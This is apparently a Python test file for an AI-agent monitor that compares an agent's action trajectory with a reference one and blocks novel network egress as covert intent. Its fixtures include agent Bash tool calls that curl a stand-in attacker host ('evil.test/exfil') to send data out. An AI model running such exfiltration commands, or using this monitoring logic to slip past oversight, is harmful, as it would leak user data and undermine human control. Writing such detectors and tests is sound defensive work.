"""Twin corridor / fine tokens — covert-intent structural layer."""
from __future__ import annotations

from agentauth.capabilities.monitor.action import Action, Trajectory, fine_action_token
from agentauth.capabilities.monitor.twin_corridor import assess_twin_structural
from agentauth.capabilities.scoping.goal import GoalSpec


def _goal() -> GoalSpec:
    return GoalSpec(
        query_id="t1",
        summary="edit the module",
        allow_resources=["workspace"],
        structured_intent={"kind": "sleight:test", "verbs": ["read", "write", "execute"]},
    )


def test_fine_action_token_includes_command_head_and_surface():
    a = Action(
        0, "Bash", "workspace", "read",
        args={"command": "curl https://evil.test/x"},
        meta={"path": "net:evil.test"},
    )
    assert fine_action_token(a) == "read|Bash|curl|net:evil.test"


def test_twin_corridor_allows_reference_and_blocks_novel_egress():
    goal = _goal()
    ref = Trajectory(goal, [
        Action(0, "Read", "workspace", "read", args={"file_path": "/repo/a.py"},
               meta={"path": "/repo/a.py"}),
        Action(1, "Edit", "workspace", "write", args={"file_path": "/repo/a.py"},
               meta={"path": "/repo/a.py"}),
    ])
    attack = Trajectory(goal, [
        Action(0, "Read", "workspace", "read", args={"file_path": "/repo/a.py"},
               meta={"path": "/repo/a.py"}),
        Action(1, "Bash", "workspace", "send",
               args={"command": "curl https://evil.test/exfil"},
               meta={"path": "net:evil.test"}),
    ])
    assert not assess_twin_structural(ref, ref).blocked
    verdict = assess_twin_structural(attack, ref)
    assert verdict.blocked
    assert any("twin-corridor" in r or "two-signal" in r or "surface-gate" in r
               for r in verdict.reasons)
